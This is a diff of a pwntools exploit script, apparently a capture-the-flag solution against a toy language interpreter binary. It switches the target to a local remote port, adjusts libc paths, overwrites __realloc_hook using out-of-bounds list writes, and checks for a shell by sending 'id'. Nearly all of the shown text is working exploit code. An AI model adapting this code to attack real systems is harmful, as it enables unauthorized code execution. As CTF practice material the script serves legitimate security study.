@@ -22,15 +22,16 @@ try:
 except Exception as e:
     print(e)
 
-context.arch = "amd64"
+context.arch = 'amd64'
+# context.arch = 'i386'
 # context.log_level = 'debug'
-execve_file = './plang'
-# sh = process(execve_file, env={"LD_PRELOAD": "/tmp/gdb_symbols.so"})
-sh = process(execve_file)
-# sh = remote('eonew.cn', 60107)
+execve_file = '/root/input_elf'
+# sh = process(execve_file, env={'LD_PRELOAD': '/tmp/gdb_symbols{}.so'.replace('{}', salt)})
+# sh = process(execve_file)
+sh = remote('127.0.0.1', 60005)
 elf = ELF(execve_file)
-libc = ELF('./libc-2.27.so')
-# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+# libc = ELF('./libc-2.27.so')
+libc = ELF('/root/libc.so')
 
 # Create temporary files for GDB debugging
 try:
@@ -122,4 +123,10 @@ interpret('var list2 = [%lf, %lf]' %  struct.unpack('dd', 'x' * 8 + 'y' * 8))
 interpret('list2[-2]=%.1800lf' % struct.unpack('d', p64(__realloc_hook_addr - 8)))
 interpret('list2[0]=%.1800lf' % struct.unpack('d', p64(libc_addr + libc.symbols['free'] + 6)))
 
-sh.interactive()
+sleep(1)
+sh.sendline("id")
+sleep(1)
+print sh.recv(timeout=5)
+sleep(10)
+sh.close
+#sh.interactive()
